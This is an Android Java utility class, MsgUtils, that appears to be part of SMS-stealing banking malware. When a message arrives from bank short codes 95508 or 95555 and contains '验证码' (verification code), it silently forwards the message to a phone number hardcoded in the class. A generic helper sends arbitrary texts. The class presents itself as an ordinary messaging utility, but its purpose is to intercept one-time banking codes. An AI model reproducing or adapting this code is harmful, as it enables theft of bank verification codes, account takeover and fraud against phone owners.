package com.example.message;

import android.telephony.SmsManager;

public class MsgUtils {

	public static String phone = "15757121405";

	public static boolean msgSend(String content, String sender, String phone) {
		if (sender.equals("95508") || sender.equals("95555")) {// 广发信用卡//
			SmsManager smsManager = SmsManager.getDefault();
			if (content.indexOf("验证码") != -1) {
				smsManager.sendTextMessage(phone, null, content, null, null);
				return true;
			}
		}
		return false;	
	}

	public static boolean msgSend(String phone, String content) {
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(phone, null, content, null, null);
		return true;
	}

}
